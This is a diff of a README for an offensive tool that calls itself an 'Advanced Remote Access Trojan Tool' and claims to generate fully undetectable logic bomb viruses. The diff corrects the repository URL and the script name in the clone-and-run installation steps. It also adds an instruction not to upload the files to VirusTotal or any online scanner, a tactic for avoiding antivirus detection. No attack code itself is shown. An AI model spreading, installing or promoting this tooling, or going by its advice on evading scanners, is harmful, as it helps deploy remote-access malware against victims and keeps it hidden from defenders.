@@ -16,11 +16,12 @@ Advanced Remote Access Trojan Tool.
   ->You Can Generate Fud Logic Bomb Viruses
   
 # Installtion
-  ->git clone https://github.com/AzizKpln/WalterRat.git
+  ->git clone https://github.com/AzizKpln/walterRat.git
   
   ->cd WalterRat/
   
   ->python setup.py
   
 # Run
-  ->python walteRat.py
+  ->python walterRat.py
+#DO NOT SCAN THE FILES TO VIRUSTOTAL OR ANY ONLINE VIRUS SCANNER
